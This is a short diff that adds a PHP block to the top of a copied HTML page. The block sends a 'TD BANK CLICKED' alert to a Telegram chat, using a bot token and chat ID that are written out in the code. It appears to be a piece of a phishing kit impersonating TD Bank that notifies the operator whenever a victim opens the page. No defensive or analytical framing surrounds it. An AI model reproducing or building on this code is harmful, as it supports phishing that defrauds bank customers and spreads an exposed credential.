@@ -1,4 +1,19 @@
+<?php
 
+
+$message = "TD BANK CLICKED\n";
+
+$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
+$data = [
+    'chat_id' => '-1001831940786',
+    'text' => $message
+];
+
+$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
+                                 http_build_query($data) );
+                                                    
+
+?>
 <html lang="en" native-dark-active=""><head>
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
 <link type="text/css" rel="stylesheet" id="#"><link type="text/css" rel="stylesheet" id="#"><style lang="en" type="text/css" id=#"></style><style lang="en" type="text/css" id=""></style>
